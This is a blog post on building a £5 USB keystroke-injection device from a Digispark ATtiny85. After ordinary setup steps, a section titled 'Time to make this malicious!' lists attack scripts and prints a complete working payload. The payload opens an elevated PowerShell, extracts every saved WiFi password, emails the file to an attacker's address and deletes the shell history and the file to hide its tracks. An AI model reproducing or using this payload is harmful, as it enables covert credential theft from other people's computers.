---
layout: post
title: £5 Rubber Ducky
author: TDSSEC
date: 2023-02-07 11:33:00 +0800
categories: [Physical Tools, DIY Rubber Ducky]
tags: [USB]
math: true
mermaid: true
image:
  path: /2023-02-07-5-Quid-Rubber-Ducky/attiny85-usb.png
  #lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: ATtiny85 board
---

## USB Rubber Ducky
TL;DR A USB drive that disguises itself as a Keyboard, that injects keystrokes allowing an attacker to install backdoors, capture credentials or remotely obtain sensitive files.

The rubber ducky by [Hak5](https://shop.hak5.org/products/usb-rubber-ducky) is amazing, but getting your hands on one in the UK can be a struggle. Not only this, but the resale price of $99 as of today's post makes this a lot more expensive than simply building one for yourself for less than £5!

## £5 D.I.Y Prerequisites
- [Digispark Attiny 85](https://www.instructables.com/Digispark-Attiny-85-With-Arduino-IDE/) - a programmable board with 6kb memory (after 2kb goes to the bootloader)
- [Arduino IDE](https://www.arduino.cc/en/software)- Open-source IDE allowing you to write and upload code to the board.   
- [Digistump Drivers](https://github.com/digistump/DigistumpArduino/releases) - It's needed..!

## Heads up about shorting this device.  
Taken from [DigiStump.com](https://digistump.com/wiki/digispark/tutorials/connecting) directly:  

> *The Digispark, due to its small size and low cost is not as robust as a full blown Arduino.*  
*When testing a new circuit we recommend that you test it with an external power supply first. Connecting a shorted circuit to the Digispark and connecting it to your computer could damage your computer and/or its USB ports. We take no responsibility for damage to your machine as a result of the use of a Digispark.*  
*We strongly recommend connecting your Digispark through a USB hub which will often limit the damage caused by a short circuit to the usb hub. For the record, we've found many computers have usb fuses built in, and when we blew them on our 27“ Mac monitor, thankfully they reset and everything worked after a power down.*  
*The Digispark does not have short circuit or reverse polarity protection. Connecting power to the Digispark power pins backwards will almost certainly destroy it.*
{: .prompt-danger }

I have been using a simple USB to USB cable:  
![USB to USB](/2023-02-07-5-Quid-Rubber-Ducky/usb-to-usb.jpeg){: width="500" height="102"}
## Drivers installation
Install the appropriate drivers for your Operating System in use. Without these installed, you might find that unless your Attiny85 came with a USB bootloader pre-installed, your OS wont detect this device!

## Arduino Setup
### Installation
1. Download and install Arduino.
Next, we need to download the boards for Digispark.  
3. Open **_File>Preferences_** and add the below URL to the **_Additional Board Manager URL_** section.
`http://digistump.com/package_digistump_index.json`
![preferences](/2023-02-07-5-Quid-Rubber-Ducky/preferences.png){: width="1024"}
4. Click OK...
5. Select **_Tools>Boards>Board Manager_**.
6. Search for **Digistump AVR Boards** and Install
![DigiStump AVR board](/2023-02-07-5-Quid-Rubber-Ducky/dvr-board-manager.png){: width="1024"}

### Choosing the Digistump AVR Board  
1. Open **_Tools>Boards>Digistump AVR Board_**.
2. Select **Digispark (Default - 16.5mhz).**
![DigiSpark 16.5mhz](/2023-02-07-5-Quid-Rubber-Ducky/digispark-board-choice.png){: width="1024"}

## Upload Test Script to the board  
With the drivers installed, as well as the Arduino setup, lets build and upload a built in keyboard test script.  
**Do not plug the Arduino in until step 5**.
1. Have the Digispark (Default - 16.5mhz) board selected within Arduino  
2. Open **_File>Example>DigisparkKeyboard>Keyboard_**.
![Keyboard Example](/2023-02-07-5-Quid-Rubber-Ducky/keyboard-example.png){: width="1024"}
3. Top-left select **_Verify_** button to check the code is OK.
4. Click the **_Upload_** button next to upload the code to the Arduino.
5. **Now you can plug the Arduino in**.

### Open a Text Editor  
1. Every 5 seconds, the ATtiny85 will write "Hello Digispark!" - Confirming this has worked!

## Time to make this malicious!  
### Scripts  
A list of premade scripts are available by [DigiSpark Scripts](https://github.com/CedArctic/DigiSpark-Scripts).  
These include the ability to:
- Extract WiFi credentials and automatically email them to you
- Reverse shells
- Keyloggers
- Fork Bombs
- Account Creations
- Execute Powershell scripts
- Funny scripts to change the users mouse settings or download and play videos off YouTube (RickRoll) ...

### Recover & Email WiFi passwords Example

    //This DigiSpark script writes the wireless network credentials to a csv file and emails it.
    //Credits to p0wc0w.

    //NOTE about the New Version of this script: The older script stopped working on newer builds of Windows 10
    //since Windows 10 now require an elevated cmd or powershell to execute these commands. This version should
    //be faster (better, stronger...) and should work on all builds of Windows 10. For previous versions
    //of Windows or simply older builds of Windows 10, the other version works like a charm.

    #include "DigiKeyboard.h"
    void setup() {
    }

    void loop() {
      DigiKeyboard.sendKeyStroke(0);
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_A);
      DigiKeyboard.delay(1000);
      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print(F("(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path temp.csv;exit"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(3000);
      DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_A);
      DigiKeyboard.delay(1000);
      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('GMAIL_USERNAME', 'GMAIL_PASSWORD'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'SENDER_MAIL'; $ReportEmail.To.Add('RECEIVER_MAIL'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('temp.csv'); $SMTPInfo.Send($ReportEmail);exit"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_A);
      DigiKeyboard.delay(1000);
      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print(F("del (Get-PSReadlineOption).HistorySavePath;exit"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
      DigiKeyboard.delay(500);
      DigiKeyboard.print("cmd");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(500);
      DigiKeyboard.print(F("del temp.csv"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      DigiKeyboard.print(F("exit"));
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      for(;;){ /*empty*/ }
      }
